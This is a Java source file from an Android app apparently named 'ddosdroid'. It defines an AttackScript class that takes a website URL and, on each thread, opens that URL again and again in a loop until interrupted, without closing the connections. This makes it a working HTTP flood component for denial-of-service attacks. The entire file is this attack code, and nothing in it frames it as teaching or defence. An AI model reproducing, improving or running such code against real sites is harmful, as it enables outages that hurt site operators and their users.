package gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.attacks;

import android.util.Log;

import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;

public class AttackScript implements Runnable {
    private static final String TAG = "AttackScript";
    private String website;

    public AttackScript(String website) {
        this.website = website;
    }

    @Override
    public void run() {
        URL url = createUrl();
        if (url != null) {
            while (!Thread.interrupted()) {
                readFromUrl(url);
            }
        }
    }

    private void readFromUrl(URL url) {
        try {
            url.openStream();
        } catch (IOException e) {
            Log.e(TAG, "openStream() error.", e);
        }
    }

    private URL createUrl() {
        URL url = null;
        try {
            url = new URL(website);
        } catch (MalformedURLException e) {
            Log.e(TAG, "Wrong url?", e);
        }
        return url;
    }
}
